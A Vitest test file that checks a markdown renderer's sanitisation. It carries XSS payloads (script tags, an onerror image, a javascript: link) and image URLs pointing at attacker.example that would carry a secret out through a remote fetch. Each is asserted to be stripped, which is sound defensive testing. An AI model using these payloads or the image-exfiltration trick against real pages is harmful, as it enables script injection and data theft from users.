import { describe, expect, it } from "vitest";
import { renderMarkdown, renderMarkdownPreview } from "@/lib/markdown/render";

describe("renderMarkdown", () => {
  it("renders bold markdown to <strong>", () => {
    expect(renderMarkdown("**bold**")).toContain("<strong>bold</strong>");
  });

  it("strips <script> tags from untrusted input", () => {
    expect(renderMarkdown("<script>alert(1)</script>")).not.toContain("<script>");
  });

  it("strips javascript: URLs from links", () => {
    expect(renderMarkdown("[x](javascript:alert(1))")).not.toContain("javascript:");
  });

  it("strips onerror event-handler attributes", () => {
    expect(renderMarkdown("<img src=x onerror=alert(1)>")).not.toContain("onerror");
  });

  it("adds safe rel/target on external links", () => {
    const html = renderMarkdown("[link](https://a.com)");
    expect(html).toContain('rel="nofollow noopener noreferrer"');
    expect(html).toContain('target="_blank"');
  });

  it("supports GFM strikethrough", () => {
    expect(renderMarkdown("~~gone~~")).toContain("<del>");
  });
});

describe("renderMarkdownPreview (run decision K54, review a2-CR-01)", () => {
  it("strips a remote image source, so the browser fetches nothing", () => {
    const html = renderMarkdownPreview("Text ![](https://attacker.example/p.png?d=secret)");
    expect(html).not.toContain("attacker.example");
    expect(html).not.toMatch(/<img[^>]*\ssrc=/);
  });

  it("strips protocol-relative and other-scheme-case image sources", () => {
    for (const markdown of [
      "![x](//attacker.example/p.png)",
      "![x](HTTP://attacker.example/p.png)",
    ]) {
      const html = renderMarkdownPreview(markdown);
      expect(html).not.toContain("attacker.example");
    }
  });

  it("a backslash form never reaches the browser as a protocol-relative source", () => {
    // Markdown percent-encodes the backslash, so the source is a path on the app's own origin.
    const html = renderMarkdownPreview(String.raw`![x](/\attacker.example/p.png)`);
    expect(html).not.toMatch(/src="(?:\/\/|\/\\|[a-z]+:)/i);
  });

  it("keeps a same-origin relative image and renders everything else like renderMarkdown", () => {
    expect(renderMarkdownPreview("![a](/api/attachments/abc)")).toContain(
      'src="/api/attachments/abc"',
    );
    const body = "## Steps\n\n**Restart** the [service](https://example.com/docs).";
    expect(renderMarkdownPreview(body)).toBe(renderMarkdown(body));
  });

  it("renderMarkdown itself is unchanged: it still keeps a remote image (manual KB articles)", () => {
    expect(renderMarkdown("![](https://example.com/p.png)")).toContain(
      'src="https://example.com/p.png"',
    );
  });
});
